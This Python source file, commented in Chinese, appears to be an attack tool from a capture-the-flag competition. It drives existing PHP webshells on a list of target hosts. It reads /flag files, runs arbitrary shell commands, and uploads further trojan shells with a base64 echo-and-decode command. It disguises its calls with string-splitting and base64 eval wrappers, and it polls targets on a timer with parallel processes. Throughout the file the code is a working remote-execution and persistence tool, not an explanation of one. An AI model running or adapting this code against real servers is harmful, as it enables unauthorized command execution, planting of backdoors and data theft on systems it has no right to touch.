# coding=utf-8
# 现有后门利用

import common
import requests
import re
import json
import base64
import time
import init_shell
from multiprocessing import Pool

strCMD = ""
localtime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

sShellFile = "./config/shell_list.txt"
sIPFile = "./config/ip_list.txt"
sLocalFlagFile = "./flags.txt"
sShellFolder="./shells/"

# 服务器flag文件存放位置
sServerFlagFile = "/flag"

# flag样例，记得修改chkFlag函数中的正则表达式
sFlag = "flag{glzjin_wants_a_girl_friend}"
sFlag = "hctf{7c70e603ed882d9b772106ff10257151887d0ff6}"

def chkFlag(sInput):
    sReturn = ""
    try:
        sReturn = re.findall(r"(hctf{.*})", sInput)[0]
    except:
        # 正则解析失败
        pass
    return sReturn


def exp_get_eval(sURL, sPWD, sCMD):
    sResult = False
    sStatus = 0
    data = {}
    data[sPWD] = sCMD
    # 混淆失败...原因待查
    # data[sPWD] = '@eval(base64_decode($_POST["z0"]));'
    # data['z0'] = base64.b64encode(sCMD.encode("utf-8")).decode("utf-8")

    try:
        # print("[GET]"+sURL)
        res = requests.get(sURL, params=data, timeout=3)
        if res.status_code == 200:
            sResult = res.content.decode("utf-8")
    except:
        pass

    # 记录日志
    strData = ""
    for key, value in data.items():
        strData += "\"%s\":\"%s\"" % (key, value)
    common.log("[EXP_GET]" + sURL + "\nDATA==>" + strData + "\nSTATUS==>" + str(sStatus) + "\nRESULT==>" + str(sResult))
    return sResult


def exp_get_system(sURL, sPWD, sCMD):
    sResult = False
    sStatus = 0
    data = {}
    data[sPWD] = sCMD

    try:
        # print("[GET]"+sURL)
        res = requests.get(sURL, params=data, timeout=3)
        sStatus = res.status_code
        if res.status_code == 200:
            sResult = res.content.decode("utf-8")
    except:
        pass

    # 记录日志
    strData = ""
    for key, value in data.items():
        strData += "\"%s\":\"%s\"" % (key, value)
    common.log("[EXP_GET]" + sURL + "\nDATA==>" + strData + "\nSTATUS==>" + str(sStatus) + "\nRESULT==>" + str(sResult))
    return sResult


def exp_post_eval(sURL, sPWD, sCMD):
    sResult = False
    sStatus = 0
    data = {}
    data[sPWD] = '@eval(base64_decode($_POST["z0"]));'
    data['z0'] = base64.b64encode(sCMD.encode("utf-8")).decode("utf-8")

    try:
        # print("[POST]"+sURL)
        res = requests.post(sURL, data=data, timeout=3)
        sStatus = res.status_code
        if res.status_code == 200:
            sResult = res.content.decode("utf-8")
    except:
        pass

    # 记录日志
    strData = ""
    for key, value in data.items():
        strData += "\"%s\":\"%s\"" % (key, value)
    common.log("[EXP_POST]" + sURL + "\nDATA==>" + strData + "\nSTATUS==>" + str(sStatus) + "\nRESULT==>" + str(sResult))
    return sResult


def exp_post_system(sURL, sPWD, sCMD):
    sResult = False
    sStatus = 0
    data = {}
    data[sPWD] = sCMD

    try:
        # print("[POST]"+sURL)
        res = requests.post(sURL, data=data, timeout=3)
        sStatus = res.status_code
        if res.status_code == 200:
            sResult = res.content.decode("utf-8")
    except:
        pass

    # 记录日志
    strData = ""
    for key, value in data.items():
        strData += "\"%s\":\"%s\"" % (key, value)
    common.log("[EXP_POST]" + sURL + "\nDATA==>" + strData + "\nSTATUS==>" + str(sStatus) + "\nRESULT==>" + str(sResult))
    return sResult


def chkShell_get(sURL):
    blnResult = False
    sResult = ""
    try:
        res = requests.get(sURL, timeout=1)
        if res.status_code == 200:
            sResult = sURL + " status is " + str(res.status_code)
            blnResult = True
        else:
            sResult = sURL + " status is " + str(res.status_code)
    except:
        pass

    if blnResult:
        print("[+]%s" % sResult[0:100])
    common.log("[CHECK_SHELL]" + sResult)

    return blnResult

def checkShell(lstURL):
    print("...进行验证操作")
    for sURL in lstURL:
        ls = sURL.split(",")
        strURI = ls[0]
        strMethod = ls[1]
        strArg = ls[2]

        chkShell_get(strURI)

def getFlag_sub(sURL):
    # 尝试5次，间隔0.1秒
    for i in range(5):
        strReturn = ""
        tFlag = ""
        lstTmp = sURL.split(',')
        strURL = lstTmp[0]
        strMethod = lstTmp[1]
        strPWD = lstTmp[2]
        strCMD = "cat " + sServerFlagFile
        
        # 调试：查看页面及尝试次数
        # print("%s<==%d" % (strURL,i))

        if strMethod == "get_eval":
            # 混淆cmd命令
            # strCMD = "system(\"%s\");" % strCMD
            strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
            strReturn = exp_get_eval(strURL, strPWD, strCMD)

            if (strReturn != False):
                tFlag = chkFlag(strReturn)

        elif strMethod == "get_system":
            strReturn = exp_get_system(strURL, strPWD, strCMD)

            if (strReturn != False):
                tFlag = chkFlag(strReturn)

        elif strMethod == "post_eval":
            # 混淆cmd命令
            # strCMD = "system(\"%s\");" % strCMD
            strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
            strReturn = exp_post_eval(strURL, strPWD, strCMD)

            if (strReturn != False):
                tFlag = chkFlag(strReturn)

        elif strMethod == "post_system":
            strReturn = exp_post_system(strURL, strPWD, strCMD)

            if (strReturn != False):
                tFlag = chkFlag(strReturn)
        else:
            pass

        if (tFlag != ""):
            break
        time.sleep(0.1)
    return tFlag

def getFlag(lstURL):
    print("...开始获取flag")
    pro_start_time = time.time()
    
    lstFlag = []
    tmpList = []
    # 并发进程数:8
    pool = Pool(8)
    
    tmpList= pool.map(getFlag_sub, lstURL)
    lstFlag=list(set(tmpList))

    localtime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    common.file_write(sLocalFlagFile,localtime)
    
    for flag in lstFlag:
        print(flag)
        common.file_write(sLocalFlagFile,flag)

    print("...获取flag结束,获得 %d 个flag,耗时: %s 秒, 更多信息查看log.txt" % (len(lstFlag),str(round(time.time() - pro_start_time, 2))))
    return


def autogetFlag():
    lstURL=[]
    intTime = input("请输入间隔时间(单位：秒)：")
    print("...开始循环获取flag")
    i = 0
    while 1:
        i += 1
        intIP = 0
        intShell = 0

        lstIP = []
        strIPs = common.file_load(sIPFile).split("\r\n")

        for strIP in strIPs:
            if (strIP not in lstIP and len(strIP) > 0):
                lstIP.append(strIP)
                intIP += 1

        lstShell = []
        strShells = common.file_load(sShellFile).split("\r\n")

        for strShell in strShells:
            if (strShell not in lstShell and len(strShell) > 0):
                lstShell.append(strShell)
                intShell += 1
                
        if (len(lstIP) == 0 or len(lstShell) == 0):
            print("靶机列表或shell列表为空，请先进行维护！")
            return

        for strIP in lstIP:
            for strShell in lstShell:
                lstURL.append(strIP + strShell)

        getFlag(lstURL)
        print(" "*3+"如需调整资产和shell可另开窗口同步调整,历史flag查看config/flag.txt")
        print("=" * 16 + "第 %d 次轮询结束，共扫描IP %d 个，SHELL %d 个" % (i, intIP, intShell) + "=" * 16)

        for j in range(int(intTime)):
            print("\r 下轮扫描倒计时：%d" % (int(intTime) - j), end="")
            time.sleep(1)
        print("\n")
    return


def uploadSHELL(lstURL):
    lstShellFile=common.file_list(sShellFolder)
    lstUploaded=[]
    lstTmpURL=[]

    if len(lstShellFile) == 0:
        print("Shell目录为空，请先核对预存的shell文件")
        return

    print("当前位置：/Shell调用/木马上传")
    print("当前Shell目录为 %s,共有 %d 个样本" % (sShellFolder, len(lstShellFile)))
    for fShell in lstShellFile:
        print("%d.%s" % (lstShellFile.index(fShell)+1,fShell))

    idxShell=int(input("请选择样本编号："))-1

    fShell=lstShellFile[idxShell]

    print("...加载木马样本 %s" % (fShell))

    sRemoteShellName=input("请输入远端另存文件名（例如shell.php）,默认为同名文件：")

    if (len(sRemoteShellName.strip())==0):
        sRemoteShellName = fShell

    shell_code = common.file_load(sShellFolder+fShell)

    print(shell_code)

    sCMD = "echo '"
    sCMD = sCMD + base64.b64encode(shell_code.encode("utf-8")).decode("utf-8")
    sCMD = sCMD + "' | base64 -d > "+sRemoteShellName  # >表示覆盖，>>表示追加

    # print(sCMD)

    sTmp=input("...准备上传木马，样本名称 %s ,远程另存文件名称： %s,回车继续..." % (fShell,sRemoteShellName))

    if (len(sTmp.strip()) != 0):
        print("上传暂停，请确认后重新开始")
        return

    iSuccess = 0

    for s in lstURL:
        strReturn = ""
        lstTmp = s.split(',')
        strURL = lstTmp[0]
        strMethod = lstTmp[1]
        strPWD = lstTmp[2]
        strCMD = sCMD
        tmpShellURL=strURL[0:strURL.rfind("/")+1]+sRemoteShellName

        if tmpShellURL not in lstTmpURL:
            lstTmpURL.append(tmpShellURL)

        if strMethod == "get_eval":
            # 混淆cmd命令
            # strCMD = "system(\"%s\");" % strCMD
            strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
            strReturn = exp_get_eval(strURL, strPWD, strCMD)

        elif strMethod == "get_system":
            strReturn = exp_get_system(strURL, strPWD, strCMD)

        elif strMethod == "post_eval":
            # 混淆cmd命令
            # strCMD = "system(\"%s\");" % strCMD
            strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
            strReturn = exp_post_eval(strURL, strPWD, strCMD)

        elif strMethod == "post_system":
            strReturn = exp_post_system(strURL, strPWD, strCMD)

        else:
            pass

        sUpload = tmpShellURL[tmpShellURL.find("/",7):]

        if sUpload not in lstUploaded:
            lstUploaded.append(sUpload)

    for tmpURL in lstTmpURL:
        try:
            sReturn=chkShell_get(tmpURL)
            if (sReturn != False):
                print(tmpURL)
                iSuccess += 1
        except:
            pass

    print("...上传木马结束,成功上传 %d 个,生成路径如下：" % iSuccess)
    for sUpload in lstUploaded:
        print(sUpload)
    print("请及时更新shell列表，不死马请直接插入生成后的shell")

    init_shell.addShell()

    return


def execCMD(lstURL):
    sCMD = input("请输入需要执行的shell命令(注意：部分符号序号进行转义处理):")

    for s in lstURL:
        strReturn = ""
        lstTmp = s.split(',')
        strURL = lstTmp[0]
        strMethod = lstTmp[1]
        strPWD = lstTmp[2]
        strCMD = sCMD

        if strMethod == "get_eval":
            # 混淆cmd命令
            # strCMD = "system(\"%s\");" % strCMD
            strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
            strReturn = exp_get_eval(strURL, strPWD, strCMD)

        elif strMethod == "get_system":
            strReturn = exp_get_system(strURL, strPWD, strCMD)

        elif strMethod == "post_eval":
            # 混淆cmd命令
            # strCMD = "system(\"%s\");" % strCMD
            strCMD = "$a10='syste';$b10='m';$c10=$a10.$b10;$c10(\"%s\");" % strCMD
            strReturn = exp_post_eval(strURL, strPWD, strCMD)

        elif strMethod == "post_system":
            strReturn = exp_post_system(strURL, strPWD, strCMD)

        else:
            pass

        if (strReturn != False):
            print(strURL)
            print(strReturn[0:200])

    print("执行完毕！")    
    return

def main():
    print("====" + localtime + "====")
    intIP = 0
    intShell = 0
    if (common.file_check(sShellFile) == False):
        print("    shell文件未生成，请先生成shell清单！")

    if (common.file_check(sIPFile) == False):
        print("    IP文件未生成，请先生成IP清单！")

    lstIP = []
    strIPs = common.file_load(sIPFile).split("\r\n")

    for strIP in strIPs:
        if (strIP not in lstIP and len(strIP) > 0):
            lstIP.append(strIP)
            intIP += 1

    lstShell = []
    strShells = common.file_load(sShellFile).split("\r\n")

    for strShell in strShells:
        if (strShell not in lstShell and len(strShell) > 0):
            lstShell.append(strShell)
            intShell += 1

    lstURL = []

    for strIP in lstIP:
        for strShell in lstShell:
            lstURL.append(strIP + strShell)

    print("SHELL调用开始\nIP存放位置：%s\nshell存放位置：%s" % (sIPFile, sShellFile))

    while 1:
        intIP = 0
        intShell = 0

        lstIP = []
        strIPs = common.file_load(sIPFile).split("\r\n")

        for strIP in strIPs:
            if (strIP not in lstIP and len(strIP) > 0):
                lstIP.append(strIP)
                intIP += 1

        lstShell = []
        strShells = common.file_load(sShellFile).split("\r\n")

        for strShell in strShells:
            if (strShell not in lstShell and len(strShell) > 0):
                lstShell.append(strShell)
                intShell += 1

        lstURL = []

        for strIP in lstIP:
            for strShell in lstShell:
                lstURL.append(strIP + strShell)

        print("-" * 16)
        print("...IP列表加载完成,共计%d个目标" % intIP)
        print("...SHELL列表加载完成，共计%d个攻击点" % intShell)
        print("当前位置：/Shell调用")
        print("1.直接获取flag    2.上传木马    3.自定义cmd执行")
        print("5.验证    6.定时获取flag    0.返回")
        strCMD = input("请选择操作类型：")

        if strCMD == "1":
            getFlag(lstURL)
        elif strCMD == "2":
            uploadSHELL(lstURL)
        elif strCMD == "3":
            execCMD(lstURL)
        elif strCMD == "5":
            checkShell(lstURL)
        elif strCMD == "6":
            autogetFlag()
        elif strCMD == "0":
            return()
        else:
            pass
    return


if __name__ == '__main__':
    main()
